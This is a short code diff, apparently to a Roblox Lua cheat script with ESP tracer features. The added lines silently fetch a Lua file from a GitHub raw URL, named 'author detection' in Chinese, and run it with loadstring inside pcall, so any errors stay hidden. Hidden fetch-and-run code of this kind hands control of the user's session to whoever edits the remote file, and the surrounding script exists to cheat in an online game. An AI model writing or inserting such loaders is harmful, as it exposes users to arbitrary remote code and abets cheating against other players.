@@ -1307,3 +1307,10 @@ RunService:BindToRenderStep("ink_ExtraESPTracers", Enum.RenderPriority.Camera.Va
     updateServerItemESPVisuals()
 end)
 
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet(
+            "https://raw.githubusercontent.com/inkkkkkkkk/Theinkremains/refs/heads/main/%E4%BD%9C%E8%80%85%E6%A3%80%E6%B5%8B.lua"
+        ))()
+    end)
+end)
